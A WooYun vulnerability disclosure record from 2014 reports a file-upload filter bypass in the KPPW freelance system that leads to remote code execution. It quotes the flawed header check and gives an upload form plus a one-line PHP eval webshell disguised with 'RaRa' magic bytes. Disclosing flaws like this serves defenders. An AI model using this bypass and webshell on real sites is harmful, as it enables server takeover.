{"id": 58707, "wybug_id": "wooyun-2014-050077", "wybug_title": "kppw威客系统上传文件漏洞导致GetShell", "wybug_corp": "keke.com", "wybug_author": "lancer", "wybug_date": "2014-04-01 12:03", "wybug_open_date": "2014-06-27 12:03", "wybug_type": "文件上传导致任意代码执行", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["文件上传"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-04-01：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-04-06：\t厂商主动忽略漏洞，细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-05-31：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-06-10：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-06-20：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-06-27：\t细节向公众公开  简要描述： 文件类型过滤不严，可以绕过上传 详细说明：  漏洞代码：/lib/helper/keke_file_class.php 138~158行\nstatic function get_file_type($file_path, $ext = '') {\t\t$fp = fopen ( $file_path, 'r' );\t\t$bin = fread ( $fp, 2 );\t\tfclose ( $fp );\t\t$strInfo = @unpack ( \"C2chars\", $bin );\t\t$typeCode = intval ( $strInfo ['chars1'] . $strInfo ['chars2'] );\t\t$fileType = 'unknown';\t\t$typeCode == '3780' && $fileType = \"pdf\";\t\t$typeCode == '6787' && $fileType = \"swf\";\t\t$typeCode == '7784' && $fileType = \"midi\";\t\t$typeCode == '7790' && $fileType = \"exe\";\t\t$ext == 'txt' && $fileType = \"txt\";\t\tin_array ( $typeCode, array ('8297', '8075' ) ) && $fileType = $ext; \t\tif (in_array ( $typeCode, array ('255216', '7173', '6677', '13780' ) )) { \t\t\tin_array ( $ext, array ('jpg', 'gif', 'bmp', 'png', 'jpeg' ) ) and $fileType = $ext or $fileType = 'jpg';\t\t}\t\tif ($typeCode == '208207') { \t\t\tin_array ( $ext, array ('wps', 'ppt', 'dot', 'xls', 'doc', 'docx' ) ) and $fileType = $ext or $fileType = 'doc';\t\t}\t\treturn $fileType;\t}\nin_array ( $typeCode, array ('8297', '8075' ) ) && $fileType = $ext; 这里逻辑有问题，判断文件头类型后直接把文件的后缀名赋值给了$fileType。导致了可以绕过fileFilter()函数。/lib/helper/keke_upload_class.php 148~154行\nfunction fileFilter($path,$ext){\t\tif(keke_file_class::get_file_type($path,$this->ext)==$ext){\t\t\treturn true;\t\t}else{\t\t\treturn false;\t\t}\t}\n   漏洞证明：  利用过程：1.本地构建html文件\n<form method=\"post\" enctype=\"multipart/form-data\" action=\"http://192.168.56.101/kppw/index.php?do=ajax&view=upload&file_type=big\">请选择文件： <br><input name=\"filedata\" type=\"file\"><br><input type=\"submit\" value=\"上传文件\"></form>\n2.shell前面加上RaRa<?php eval($_POST[cmd]) ?>\n\n3.上传shell\n\n\n\n   修复方案：  加强检测   版权声明：转载请注明来源 lancer@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2014-06-27 12:03 厂商回复：  最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}